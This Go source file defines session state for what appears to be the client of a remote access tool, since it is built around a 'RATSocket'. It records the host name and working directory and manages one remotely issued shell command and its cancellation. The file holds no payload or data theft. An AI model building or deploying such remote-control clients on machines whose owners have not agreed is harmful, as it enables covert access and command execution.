package executor

import (
	"context"
	"os"
	"strings"
	"sync"

	"client-go/protocol"
)

type Session struct {
	Sock                 *protocol.RATSocket
	ClientID             string
	HostName             string
	Cwd                  string
	CurrentCommandID     int
	shellMu              sync.Mutex
	shellCommandID       int
	shellCancel          context.CancelFunc
	shellCancelID        int
	shellCancelRequested bool
}

func NewSession(sock *protocol.RATSocket, clientID string) *Session {
	wd, err := os.Getwd()
	if err != nil {
		wd = "."
	}

	host, err := os.Hostname()
	if err != nil || strings.TrimSpace(host) == "" {
		host = clientID
	}

	return &Session{
		Sock:     sock,
		ClientID: strings.TrimSpace(clientID),
		HostName: host,
		Cwd:      wd,
	}
}

// Shell commands are the only cancellable execution mode in the minimal Go Client.
func (s *Session) BeginShell(id int, cancel context.CancelFunc) bool {
	s.shellMu.Lock()
	defer s.shellMu.Unlock()
	if s.shellCommandID != 0 {
		return false
	}
	s.shellCommandID = id
	s.shellCancel = cancel
	s.shellCancelID = 0
	s.shellCancelRequested = false
	return true
}

func (s *Session) HasActiveShell() bool {
	s.shellMu.Lock()
	defer s.shellMu.Unlock()
	return s.shellCommandID != 0
}

func (s *Session) CancelShell(id, cancelID int) bool {
	s.shellMu.Lock()
	defer s.shellMu.Unlock()
	if s.shellCommandID != id || s.shellCancel == nil {
		return false
	}
	if !s.shellCancelRequested {
		s.shellCancelRequested = true
		s.shellCancelID = cancelID
		s.shellCancel()
	}
	return true
}

func (s *Session) EndShell(id int) (bool, int) {
	s.shellMu.Lock()
	defer s.shellMu.Unlock()
	if s.shellCommandID != id {
		return false, 0
	}
	cancelled, cancelID := s.shellCancelRequested, s.shellCancelID
	s.shellCommandID = 0
	s.shellCancel = nil
	s.shellCancelID = 0
	s.shellCancelRequested = false
	return cancelled, cancelID
}
